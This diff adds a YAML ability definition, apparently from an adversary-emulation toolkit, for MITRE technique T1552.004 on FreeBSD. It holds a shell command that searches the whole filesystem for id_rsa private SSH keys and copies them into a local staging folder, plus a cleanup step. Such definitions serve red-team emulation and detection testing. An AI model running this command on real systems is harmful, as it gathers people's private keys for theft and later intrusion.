@@ -1,0 +1,19 @@
+---
+- id: d39e22a99fd0b29fd6d58aab4d5bb276
+  name: Copy Private SSH Keys with rsync (freebsd)
+  description: 'Copy private SSH keys on a FreeBSD system to a staging folder using
+    the `rsync` command.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ ! -x "$(command -v rsync)" ]; then (which pkg && pkg install
+          -y rsync); fi;  mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null
+          -exec rsync -R {} /tmp/art-staging \; '
+        payloads: []
+        cleanup: rm -rf /tmp/art-staging
